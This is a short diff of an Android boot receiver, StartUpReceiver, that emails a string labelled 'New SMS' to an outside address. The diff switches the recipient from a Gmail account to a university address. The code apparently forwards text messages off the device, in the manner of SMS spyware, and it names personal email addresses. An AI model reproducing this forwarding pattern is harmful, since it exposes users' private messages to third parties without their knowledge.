@@ -193,7 +193,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 String line = null;
                 line = StringMake.getString();
 
-                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "pavlos.repin@gmail.com");
+                sender.sendMail("New SMS", line, "", "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
